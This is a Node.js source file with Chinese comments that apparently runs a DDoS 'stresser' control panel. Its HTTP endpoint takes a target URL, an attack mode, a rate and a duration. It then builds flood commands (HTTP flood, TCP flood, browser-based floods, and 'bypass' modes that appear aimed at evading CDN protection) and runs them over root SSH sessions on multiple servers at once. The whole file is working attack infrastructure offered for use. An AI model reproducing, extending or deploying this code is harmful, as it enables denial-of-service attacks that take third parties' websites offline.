const express = require('express');
const { Client } = require('ssh2');

const app = express();
const port = 3300;

// 多个服务器配置
const servers = [
    {
        name: 'server1',
        config: {
            host: '你的IP',
            port: 22,
            username: 'root',
            password: '你的密码'
        },
        conn: null,
        ready: false,
        reconnectTimer: null
    },
    {
        name: 'server2',
        config: {
            host: '你的IP',
            port: 22,
            username: 'root',
            password: '你的密码'
        },
        conn: null,
        ready: false,
        reconnectTimer: null
    }
];

// 建立 SSH 连接
function connectToServer(server) {
    if (server.conn) server.conn.end();
    const conn = new Client();

    console.log(`尝试连接 ${server.name} (${server.config.host})...`);

    conn.on('ready', () => {
        server.ready = true;
        console.log(`✅ ${server.name} SSH 连接已建立`);
        if (server.reconnectTimer) {
            clearInterval(server.reconnectTimer);
            server.reconnectTimer = null;
        }
    }).on('error', (err) => {
        console.error(`❌ ${server.name} SSH 错误:`, err.message);
        server.ready = false;
        tryReconnect(server);
    }).on('end', () => {
        console.log(`🔌 ${server.name} SSH 连接断开`);
        server.ready = false;
        tryReconnect(server);
    }).on('close', () => {
        console.log(`❗${server.name} SSH 连接关闭`);
        server.ready = false;
        tryReconnect(server);
    }).connect(server.config);

    server.conn = conn;
}

// 自动重连机制
function tryReconnect(server) {
    if (server.reconnectTimer) return;
    server.reconnectTimer = setInterval(() => {
        if (!server.ready) {
            console.log(`🔁 ${server.name} 正在尝试重新连接...`);
            connectToServer(server);
        }
    }, 5000);
}

// 初始化连接
servers.forEach(connectToServer);

// 参数校验
function validateParams({ target, rate, time, version, ua, method, num, mode }) {
    try {
        const url = new URL(target);
        const allowedProtocols = ['http:', 'https:'];
        if (!allowedProtocols.includes(url.protocol)) return false;
        if (/[|&;$<>]/.test(target) || /\s/.test(target)) return false;
    } catch {
        return false;
    }

    const validModes = [
        'flood', 'tcp',
        'https-browser', 'http-browser',
        'https-bypass', 'http-bypass',
        'browser'
    ];

    if (!validModes.includes(mode)) return false;
    if (!['h1', 'h2'].includes(version)) return false;
    if (!['default', 'ios', 'win'].includes(ua)) return false;
    if (!['GET', 'POST'].includes(method)) return false;
    if (isNaN(rate) || isNaN(time) || isNaN(num)) return false;

    return true;
}

// 命令生成器
function buildCommand(mode, target, rate, time, version, ua, method, port = 443) {
    switch (mode) {
        case 'flood':
            return `./fox GET ${target} http.txt ${time} 128 128`;
        case 'tcp':
            return `node tcp.js ${target} ${port} ${time}`;
        case 'https-browser':
            return `./start "${target}" 60 r.txt 4 ${time} ${time} on --key=aicdn --dropproxy=none --ua=${ua}`;
        case 'http-browser':
            return `./start "${target}" 60 r.txt ${time} ${time} on --key=aicdn --dropproxy=none --ua=${ua} --protocol=h1`;
        case 'https-bypass':
            return `./browser "${target}" ${time} 20 40 r.txt http2 40 sswc-nms1-833aew3`;
        case 'http-bypass':
            return `./browser "${target}" ${time} 20 40 r.txt http1 40 sswc-nms1-833aew3`;
        case 'browser':
            return `nohup ./start '${target}' 50 sm.txt ${rate} ${time} ${time} --protocol=${version} --ua=${ua} --method=${method} > /dev/null 2>&1 &`;
        default:
            return '';
    }
}

// 请求入口
app.get('/aappii', (req, res) => {
    const { target, rate, time, version, ua, method, num, mode } = req.query;

    if (!validateParams({ target, rate, time, version, ua, method, num, mode })) {
        return res.json({ status: false, message: '参数校验失败' });
    }

    const count = Math.min(parseInt(num), servers.length);
    const readyServers = servers.filter(s => s.ready).slice(0, count);

    if (readyServers.length < count) {
        return res.json({ status: false, message: `可用服务器不足，需要 ${count} 个，但只有 ${readyServers.length} 个可用` });
    }

    const command = buildCommand(mode, target, rate, time, version, ua, method);
    const killCommand = `pkill -f chrome`;

    if (!command) {
        return res.json({ status: false, message: '命令生成失败，请检查 mode 参数' });
    }

    readyServers.forEach(server => {
        console.log(`🚀 [${server.name}] 执行: ${command}`);
        server.conn.exec(command, (err, stream) => {
            if (err) {
                console.error(`[${server.name}] 主命令出错:`, err);
                return;
            }

            stream.on('close', (code) => {
                console.log(`✅ [${server.name}] 主命令完成，退出码: ${code}`);
                setTimeout(() => {
                    server.conn.exec(killCommand, (err2, stream2) => {
                        if (err2) {
                            console.error(`[${server.name}] 关闭命令出错:`, err2);
                            return;
                        }
                        stream2.on('close', code2 => {
                            console.log(`🛑 [${server.name}] 已执行清理命令，退出码: ${code2}`);
                        }).on('data', data => {
                            console.log(`[${server.name}] 输出: ${data.toString()}`);
                        }).stderr.on('data', data => {
                            console.error(`[${server.name}] 错误输出: ${data.toString()}`);
                        });
                    });
                }, time * 1000);
            });
        });
    });

    res.json({
        status: true,
        message: `已在 ${readyServers.map(s => s.name).join(', ')} 启动 ${mode} 模式任务`
    });
});

app.listen(port, () => {
    console.log(`🚀 HTTP 服务已启动，监听端口 ${port}`);
});
